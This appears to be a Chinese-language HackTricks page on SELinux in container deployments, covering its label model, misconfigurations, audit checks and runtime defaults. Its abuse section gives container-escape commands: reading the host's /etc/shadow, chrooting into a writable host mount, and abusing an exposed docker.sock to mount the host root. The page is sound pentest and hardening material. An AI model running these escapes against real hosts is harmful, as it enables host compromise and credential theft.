# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## 概述

SELinux 是一种 **基于标签的强制访问控制** (Mandatory Access Control) 系统。每个相关的进程和对象都可能携带安全上下文，策略决定哪些域可以以何种方式与哪些类型交互。在容器化环境中，这通常意味着运行时以受限的容器域启动容器进程，并将容器内容标记为相应的类型。如果策略配置正确，进程可以读取和写入其标签所允许访问的内容，同时被拒绝访问其他主机内容，即使这些内容通过挂载变得可见。

这是主流 Linux 容器部署中最强大的主机端防护之一。在 Fedora、RHEL、CentOS Stream、OpenShift 以及其他以 SELinux 为中心的生态系统中尤为重要。在这些环境中，忽视 SELinux 的审查者通常会误解为什么看似可行的主机入侵路径实际上被阻止。

## AppArmor Vs SELinux

最容易理解的高层差异是 AppArmor 基于路径 (path-based)，而 SELinux 是 **基于标签 (label-based)**。这对容器安全有重大影响。路径式策略在相同的主机内容通过意外的挂载路径暴露时可能表现不同。标签式策略则检查对象的标签以及进程域对该对象可以执行的操作。这样并不意味着 SELinux 简单，但确实使其对一类在 AppArmor 系统中防御者有时会无意做出的路径技巧假设更具鲁棒性。

由于该模型以标签为导向，容器卷的处理和重新标记决策对安全至关重要。如果运行时或操作员为了“让挂载生效”而过度更改标签，原本用于隔离工作负载的策略边界可能会比预期弱得多。

## Lab

要查看 SELinux 是否在主机上启用：
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
查看主机上现有的标签：
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
要比较正常运行与禁用 labeling 的运行：
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
在启用了 SELinux 的主机上，这个示例非常实用，因为它展示了在预期的容器域下运行的工作负载与被剥离了该强制执行层的工作负载之间的差异。

## 运行时用法

Podman 在那些将 SELinux 作为平台默认配置的系统上与 SELinux 特别契合。Rootless Podman 加上 SELinux 是最强的主流容器基线之一，因为进程在主机端已经是非特权的，并且仍受 MAC policy 的约束。Docker 在支持的环境下也可以使用 SELinux，但管理员有时会为了绕过卷标记的摩擦而禁用它。CRI-O 和 OpenShift 在其容器隔离方案中严重依赖 SELinux。Kubernetes 也可以暴露与 SELinux 相关的设置，但这些设置的价值显然取决于节点操作系统是否确实支持并强制执行 SELinux。

反复出现的教训是，SELinux 不是可选的点缀。在围绕它构建的生态系统中，它是预期的安全边界的一部分。

## 错误配置

经典错误是 `label=disable`。在实际操作中，这通常发生在某个卷挂载被拒绝时，最短期的快速解决办法是把 SELinux 从方程中移除，而不是修正标签模型。另一个常见错误是对主机内容进行错误的 relabel。大范围的 relabel 操作可能会让应用工作，但也可能把容器被允许接触的范围扩展到远超原先预期的程度。

同样重要的是不要把 **已安装的** SELinux 与 **实际生效的** SELinux 混淆。主机可能支持 SELinux，但仍处于 permissive 模式，或者 runtime 可能没有在预期的域下启动工作负载。在这些情况下，保护比文档可能暗示的要弱得多。

## 滥用

当 SELinux 不存在、处于 permissive 状态，或被广泛为工作负载禁用时，主机挂载路径就更容易被滥用。原本会被标签限制的同一 bind mount 可能会直接成为访问主机数据或修改主机的途径。特别是在与可写卷挂载、容器运行时目录，或为了方便而暴露敏感主机路径的运维捷径结合时，这一点尤其相关。

SELinux 常能解释为什么某个通用的 breakout 漏洞演示在一台主机上立即生效，但在另一台尽管 runtime 标志看起来相似却反复失败。缺失的要素往往不是命名空间或 capability，而是仍然完整的标签边界。

最快速的实用检查是比较活动上下文，然后探测那些通常会被标签约束的挂载主机路径或运行时目录：
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
如果存在主机 bind mount，并且 SELinux labeling 已被禁用或弱化，通常首先发生的是信息泄露：
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
如果 mount 是 writable，且从 kernel 的角度看该 container 实际上拥有 host-root 权限，下一步应测试可控的 host 修改，而非盲猜：
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
在支持 SELinux 的主机上，运行时状态目录的标签丢失也可能暴露直接的 privilege-escalation 路径：
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
这些命令并不替代完整的逃逸链，但它们可以非常快速地判断是否是 SELinux 阻止了对主机数据的访问或对主机端文件的修改。

### 完整示例: SELinux 被禁用 + 可写的主机挂载

如果 SELinux 标记被禁用并且主机文件系统在 `/host` 以可写方式挂载，那么完整的主机逃逸就会变成普通的 bind-mount 滥用案例：
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
如果 `chroot` 成功，容器进程现在正在从主机文件系统中运行：
```bash
id
hostname
cat /etc/passwd | tail
```
### 完整示例：SELinux 禁用 + 运行时目录

如果在标签被禁用后，工作负载能够访问运行时 socket，则逃逸可以委派给运行时：
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
## 检查

SELinux 检查的目标是确认 SELinux 是否已启用，识别当前的安全上下文，并查看你关心的文件或路径是否实际受标签约束。
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
What is interesting here:

- `getenforce` 理想情况下应返回 `Enforcing`；`Permissive` 或 `Disabled` 会改变整个 SELinux 部分的含义。
- 如果当前进程上下文看起来异常或过于宽泛，工作负载可能没有在预期的容器策略下运行。
- 如果主机挂载的文件或运行时目录的标签被进程过度访问，bind mounts 的风险会大大增加。

在支持 SELinux 的平台上审查容器时，不要把标签视为次要细节。在许多情况下，它是主机尚未被攻破的主要原因之一。

## Runtime Defaults

| Runtime / platform | 默认状态 | 默认行为 | 常见的手工弱化 |
| --- | --- | --- | --- |
| Docker Engine | 取决于主机 | 在启用 SELinux 的主机上可用，但具体行为取决于主机/守护进程的配置 | `--security-opt label=disable`, 对 bind mounts 的宽泛 relabeling, `--privileged` |
| Podman | 在启用 SELinux 的主机上通常启用 | 在 SELinux 系统上，SELinux 隔离是 Podman 的常规部分，除非被禁用 | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | 通常不会在 Pod 级别自动分配 | 存在 SELinux 支持，但 Pods 通常需要 `securityContext.seLinuxOptions` 或平台特定的默认值；需要运行时和节点的支持 | 弱化或过宽的 `seLinuxOptions`、在 permissive/disabled 节点上运行、使标签失效的平台策略 |
| CRI-O / OpenShift style deployments | 通常被大量依赖 | 在这些环境中，SELinux 通常是节点隔离模型的核心部分 | 使访问范围过宽的自定义策略，为兼容性禁用标签 |

SELinux 的默认设置比 seccomp 更依赖发行版。在 Fedora/RHEL/OpenShift 风格的系统上，SELinux 常常是隔离模型的核心。在非 SELinux 系统上，它则不存在。
